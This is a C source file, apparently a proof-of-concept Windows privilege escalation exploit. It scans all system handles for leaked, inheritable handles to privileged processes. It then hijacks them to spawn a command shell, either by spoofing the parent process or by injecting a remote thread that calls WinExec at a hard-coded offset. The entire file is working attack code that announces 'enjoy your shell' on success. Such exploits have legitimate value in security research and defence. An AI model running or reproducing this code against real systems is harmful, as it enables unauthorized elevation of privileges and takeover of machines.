#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <TlHelp32.h>
#include <securitybaseapi.h>

#include "poc.h"

#define log_warn(x) (printf("[-] Err: %s\n", x))

#define zalloc(x) (calloc(x, 1))

PID_HANDLE_OBJECT_MAP g_pid_handle_object_map_head;
TARGET                g_target_head;

NQSI _NtQuerySystemInformation = (NQSI)NULL;

int main(void)
{
    PSYSTEM_HANDLE_INFORMATION handles = NULL;
    PTARGET                    cur = NULL;
    HANDLE                     clone = NULL;
    BOOL                       status;

    if (!NT_SUCCESS(resolve_symbols()))
        goto out;

    if (!NT_SUCCESS(init_map()))
        goto out;

    if (!NT_SUCCESS(query_handles(&handles)))
        goto out;

    if (!NT_SUCCESS(fill_map(handles)))
        goto out;

    if (!NT_SUCCESS(search_targets(handles)))
        goto out;

    cur = g_target_head.next;

    for (; cur; cur = cur->next) {
        if ( cur->handle && cur->access_type) {
            if ((cur->access_type == PROCESS_ALL_ACCESS) ||
                (cur->access_type & PROCESS_CREATE_PROCESS)) {
                if (NT_SUCCESS(spoof_parent(cur->pid, cur->handle))) {
                    puts("[+] Exploit successful, enjoy your shell");
                    goto out;
                }
            }
            else if (cur->access_type & PROCESS_CREATE_THREAD) {
                if (NT_SUCCESS(create_thread(cur->pid, cur->handle))) {
                    puts("[+] Exploit successful, enjoy your shell");
                    goto out;
                }
            }
            else
                puts("[*] This access is not supported yet");
        }
        else
            break;
    }

    puts("[-] No more targets to try");

out:
    if (handles)
        free(handles);

    return 0;
}

NTSTATUS resolve_symbols(void)
{
    NTSTATUS    status = STATUS_SUCCESS;
    HMODULE     ntdll = NULL;

    puts("[+] Resolving internal functions...");

    ntdll = LoadLibraryA("ntdll");
    if (ntdll == NULL) {
        log_warn("resolve_symbols::LoadLibraryA()1");
        status = STATUS_NOT_FOUND;
        goto out;
    }

    _NtQuerySystemInformation = (NQSI)GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (_NtQuerySystemInformation == NULL) {
        log_warn("resolve_symbols::GetProcAddress()1");
        status = STATUS_NOT_FOUND;
        goto out;
    }

    puts("[+] All functions resolved");

out:
    return status;
}

NTSTATUS init_map(void)
{
    NTSTATUS                   status = STATUS_SUCCESS;
    HANDLE                     snapshot;
    PROCESSENTRY32             pe;
    int                        counter = 0;
    PPID_HANDLE_OBJECT_MAP     cur = NULL, next = NULL;
    HANDLE                     process = NULL;

    puts("[+] Opening handles to processes to initialize map");

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        log_warn("init_map::CreateToolhelp32Snapshot()1");
        status = STATUS_INVALID_HANDLE;
        goto out;
    }

    cur = (PPID_HANDLE_OBJECT_MAP)zalloc(sizeof(PID_HANDLE_OBJECT_MAP));
    if (!cur) {
        log_warn("init_map::zalloc()1");
        status = STATUS_NO_MEMORY;
        goto out;
    }
    g_pid_handle_object_map_head.next = cur;

    pe.dwSize = sizeof(PROCESSENTRY32);

    while (Process32Next(snapshot, &pe)) {
        process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
        if (pe.th32ProcessID == 12900)
            if (process == NULL) {
                printf("%p\n", GetLastError());
                printf("NULL\n");
            }
        if (process) {
            cur->handle = process;
            cur->pid = pe.th32ProcessID;

            counter++;

            next = (PPID_HANDLE_OBJECT_MAP)zalloc(sizeof(PID_HANDLE_OBJECT_MAP));
            if (!next) {
                log_warn("init_map::zalloc()2");
                status = STATUS_NO_MEMORY;
                goto out;
            }

            cur->next = next;
            cur = cur->next;
        }
    }

    printf("[+] Opened %d process handles\n", counter);

out:
    return status;
}

NTSTATUS query_handles(_Out_ PSYSTEM_HANDLE_INFORMATION *handles)
{
    NTSTATUS                    status = STATUS_SUCCESS;
    PSYSTEM_HANDLE_INFORMATION  handle_info = NULL;
    UINT64                      handle_info_sz = 0x10000;
    int                         counter = 0;

    puts("[+] Calling NtQuerySystemInformation() to retrieve all opened handles...");

    handle_info = (PSYSTEM_HANDLE_INFORMATION)zalloc(handle_info_sz);
    if (!handle_info) {
        log_warn("query_handles::zalloc()1");
        status = STATUS_NO_MEMORY;
        goto out;
    }

    while ((status = _NtQuerySystemInformation(
        SystemHandleInformation,
        handle_info,
        handle_info_sz,
        NULL)) == STATUS_INFO_LENGTH_MISMATCH) {

        handle_info = realloc(handle_info, handle_info_sz *= 2);
        if (!handle_info) {
            log_warn("query_handles::realloc()1");
            status = STATUS_NO_MEMORY;
            goto out;
        }
    }

    if (!NT_SUCCESS(status)) {
        log_warn("fill_maps::NtQuerySystemInformation()1");
        goto out;
    }

    printf("[+] Fetched %d handles\n", handle_info->NumberOfHandles);

out:
    if (NT_SUCCESS(status))
        *handles = handle_info;
    else
        *handles = NULL;

    return status;
}

NTSTATUS fill_map(_In_ PSYSTEM_HANDLE_INFORMATION handles)
{
    NTSTATUS                status = STATUS_SUCCESS;
    DWORD                   own_pid;
    PPID_HANDLE_OBJECT_MAP  cur;
    int                     counter = 0;

    puts("[+] Mapping the PID, handle and object address of opened processes...");

    own_pid = GetCurrentProcessId();
    cur = g_pid_handle_object_map_head.next;
    
    for (; cur; cur=cur->next)
        for (int i = 0; i < handles->NumberOfHandles; i++)
            if (handles->Handles[i].dwProcessId == own_pid)
                if (cur->handle == handles->Handles[i].wValue) {
                    cur->object = handles->Handles[i].pAddress;
                    counter++;
                    break;
                }

    printf("[+] Maps of %d handles successfully created\n", counter);

out:
    return status;
}

NTSTATUS search_targets(_In_ PSYSTEM_HANDLE_INFORMATION handles)
{
    NTSTATUS                    status = STATUS_SUCCESS;
    DWORD                       integrity;
    int                         counter = 0;
    PTARGET                     cur = NULL, next = NULL;
    PPID_HANDLE_OBJECT_MAP      cur_map;
    DWORD                       pid = 0;

    puts("[+] Searching for potential targets...");

    cur = (PTARGET)zalloc(sizeof(TARGET));
    if (!cur) {
        log_warn("search_targets::zalloc()1");
        status = STATUS_NO_MEMORY;
        goto out;
    }
    
    g_target_head.next = cur;

    for (int i = 0; i < handles->NumberOfHandles; i++) {
        cur_map = g_pid_handle_object_map_head.next;
        pid = 0;

        if (!(handles->Handles[i].bObjectType == 0x7))
            continue; // check if handle is to a process

        if (!(handles->Handles[i].GrantedAccess == PROCESS_ALL_ACCESS ||
            handles->Handles[i].GrantedAccess & PROCESS_CREATE_PROCESS ||
            handles->Handles[i].GrantedAccess & PROCESS_CREATE_THREAD ||
            handles->Handles[i].GrantedAccess & PROCESS_DUP_HANDLE ||
            handles->Handles[i].GrantedAccess & PROCESS_VM_WRITE))
            continue; // check if has desired access

        if (!(handles->Handles[i].bFLags & OBJ_INHERIT))
            continue; // check if inherited

        if (!NT_SUCCESS(get_integrity(handles->Handles[i].dwProcessId, &integrity))) {
            continue; // check if integrity is medium or lower
        }
        if (integrity > SECURITY_MANDATORY_MEDIUM_RID)
            continue; // check if integrity is medium or lower

        for (; cur_map; cur_map = cur_map->next)
            if (cur_map->object == handles->Handles[i].pAddress) {
                pid = cur_map->pid;
                break;
            }

        if (pid == 0) {
            // interesting case, not mapped might be because it's privileged
            puts("[*] Process that this handle refers to is not mapped");
            printf("  -- opened by: %d, opened process: not found, handle: 0x%x\n", handles->Handles[i].dwProcessId, handles->Handles[i].wValue);
        }

        //printf("-- opened by: %d, opened process: %d, handle of 0x%x\n", handles->Handles[i].dwProcessId, pid, handles->Handles[i].wValue);

        if (pid != 0) {
            if (NT_SUCCESS(get_integrity(pid, &integrity)))
                if (integrity != -1 && integrity <= SECURITY_MANDATORY_MEDIUM_RID)
                    continue; // check if process handle is privileged
        }
        else
            integrity = SECURITY_MANDATORY_SYSTEM_RID;

        // if pass all checks, add to targets

        cur->access_type = handles->Handles[i].GrantedAccess;
        cur->integrity = integrity;
        cur->pid = handles->Handles[i].dwProcessId;
        cur->handle = handles->Handles[i].wValue;

        counter++;
        
        next = (PTARGET)zalloc(sizeof(TARGET));
        if (!next) {
            log_warn("search_targets::zalloc()2");
            status = STATUS_NO_MEMORY;
            goto out;
        }

        cur->next = next;
        cur = cur->next;
    }
    
    printf("[+] Found %d potential targets\n", counter);

out:
    return status;
}

NTSTATUS get_integrity(_In_ DWORD pid, _Out_ PDWORD integrity_level)
{
    NTSTATUS                    status = STATUS_SUCCESS;
    PTOKEN_MANDATORY_LABEL      out;
    DWORD                       sz = 0x100;
    int                         needed = 0;
    HANDLE                      process = NULL, token = NULL;
    DWORD                       integrity = -1;

    out = (PTOKEN_MANDATORY_LABEL)calloc(sz, sizeof(char));
    needed = 0;

    process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (process == NULL) {
        status = STATUS_INTERNAL_ERROR;
        goto out;
    }

    if (!OpenProcessToken(process, TOKEN_QUERY, &token)) {
        status = STATUS_INTERNAL_ERROR;
        goto out;
    }

    do {
        out = realloc(out, sz *= 2);
        GetTokenInformation(token, TokenIntegrityLevel, out, sz, &needed);
    } while (GetLastError() == ERROR_INSUFFICIENT_BUFFER);

    integrity = *GetSidSubAuthority(
        out->Label.Sid,
        (DWORD)(UCHAR)(*GetSidSubAuthorityCount(out->Label.Sid) - 1)
    );

out:
    if (process) {
        CloseHandle(process);
        process = NULL;
    }

    if (token) {
        CloseHandle(token);
        token = NULL;
    }

    if (out) {
        free(out);
        out = NULL;
    }

    if (status == STATUS_SUCCESS)
        *integrity_level = integrity;
    else
        *integrity_level = -1;

    return status;
}

NTSTATUS spoof_parent(_In_ DWORD pid, _In_ HANDLE handle)
{
    NTSTATUS                        status = STATUS_SUCCESS;
    STARTUPINFOEXA                  si = { 0 };
    PROCESS_INFORMATION             pi = { 0 };
    LPPROC_THREAD_ATTRIBUTE_LIST    ptList = NULL;
    SIZE_T                          bytes = 0;
    HANDLE                          process = NULL, clone = NULL;
    BOOL                            success;
    char                            commandline[] = "C:\\Windows\\System32\\cmd.exe";

    puts("[+] Trying to spawn shell by spoofing parent process...");

    process = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid);
    if (!process) {
        status = STATUS_INTERNAL_ERROR;
        goto out;
    }

    success = DuplicateHandle(process, handle, GetCurrentProcess(), &clone, NULL, FALSE, DUPLICATE_SAME_ACCESS);
    if (!success) {
        status = STATUS_INTERNAL_ERROR;
        goto out;
    }

    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    InitializeProcThreadAttributeList(NULL, 1, 0, &bytes);
    ptList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(bytes);
    InitializeProcThreadAttributeList(ptList, 1, 0, &bytes);
    UpdateProcThreadAttribute(ptList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &clone, sizeof(HANDLE), NULL, NULL);
    si.lpAttributeList = ptList;

    success = CreateProcessA(
        NULL,
        commandline,
        NULL,
        NULL,
        TRUE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si.StartupInfo,
        &pi);

    if (!success)
        status = STATUS_INTERNAL_ERROR;

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

out:
    return status;
}

NTSTATUS create_thread(_In_ DWORD pid, _In_ HANDLE handle)
{
    NTSTATUS    status = STATUS_SUCCESS;
    HMODULE     msvcrt = NULL;
    UINT64      base = 0, cmd_addr = 0;
    HANDLE      thread;

    puts("[+] Trying to get shell by creating thread");
    puts("[*] If this fails, replace the hardcoded offset manually in the program");

    msvcrt = LoadLibraryA("msvcrt");
    if (msvcrt == NULL) {
        log_warn("create_thread::LoadLibraryA()1");
        status = STATUS_NOT_FOUND;
        goto out;
    }

    status = get_base_address(pid, L"msvcrt.dll", &base);
    if (!NT_SUCCESS(status))
        goto out;
        
    cmd_addr = (UINT64)(base + 0x79e48); // use ida to find the offset manually

    thread = CreateRemoteThread(handle, NULL, 0,
        (LPTHREAD_START_ROUTINE)WinExec,
        (LPVOID)cmd_addr,
        0, NULL);

    if (!thread)
        status = STATUS_INTERNAL_ERROR;

out:
    return status;
}

NTSTATUS get_base_address(_In_ DWORD pid, _In_ const wchar_t *name, _Out_ UINT64 *base)
{
    NTSTATUS        status = STATUS_INTERNAL_ERROR;
    HANDLE          snapshot = NULL;
    MODULEENTRY32   me;

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (snapshot == INVALID_HANDLE_VALUE) {
        log_warn("get_base_address::CreateToolhelp32Snapshot()1");
        status = STATUS_INTERNAL_ERROR;
        goto out;
    }

    me.dwSize = sizeof(MODULEENTRY32);
    while (Module32Next(snapshot, &me)) {
        if (!_wcsicmp(me.szModule, name))
        {
            *base = (UINT64)me.modBaseAddr;
            status = STATUS_SUCCESS;
            break;
        }
    }

out:
    if (snapshot && snapshot != INVALID_HANDLE_VALUE)
        CloseHandle(snapshot);

    return status;
}
